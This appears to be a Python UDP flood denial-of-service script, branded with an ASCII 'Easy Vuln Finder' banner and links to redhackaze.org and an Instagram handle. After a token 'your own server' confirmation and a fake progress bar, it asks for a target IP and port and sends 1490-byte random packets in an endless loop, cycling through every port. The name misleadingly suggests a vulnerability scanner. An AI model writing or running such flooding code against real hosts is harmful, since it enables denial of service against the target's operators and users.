import sys
import os
import time
import socket
import random
from datetime import datetime
now = datetime.now()


sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)

count = 1
while(count<2):
    print("""  ______                 __      __    _          ______ _           _
 |  ____|                \ \    / /   | |        |  ____(_)         | |
 | |__   __ _ ___ _   _   \ \  / /   _| |_ __    | |__   _ _ __   __| | ___ _ __
 |  __| / _` / __| | | |   \ \/ / | | | | '_ \   |  __| | | '_ \ / _` |/ _ \ '__|
 | |___| (_| \__ \ |_| |    \  /| |_| | | | | |  | |    | | | | | (_| |  __/ |
 |______\__,_|___/\__, |     \/  \__,_|_|_| |_|  |_|    |_|_| |_|\__,_|\___|_|
                   __/ |
                  |___/
redhackaze.org | MyPoison ig:@yusuf.ngs                  """)
    issure = input("Are You Sure? You have to do this to your own server(Y/N) \neasyvuln > ")
    if(issure == "Y" or issure == "y"):
        os.system("cls")
        ip = input("IP Target \neasyvuln > ")
        port = int(input("Port \neasyvuln > "))
        os.system("cls")
        print ("[                    ] 0% ")
        time.sleep(5)
        print ("[>>>>               ] 25%")
        time.sleep(5)
        print ("[>>>>>>>>>          ] 50%")
        time.sleep(5)
        print ("[>>>>>>>>>>>>>>>>>  ] 75%")
        time.sleep(5)
        print ("[>>>>>>>>>>>>>>>>>>>] 100%")
        time.sleep(3)
        sent = 0
        while True:
             sock.sendto(bytes, (ip,port))
             sent = sent + 1
             port = port + 1
             print ("%s packets are sending to the %s . Port number:%s"%(sent,ip,port))
             if (port == 65534):
               port = 1
    else:
        count +=1
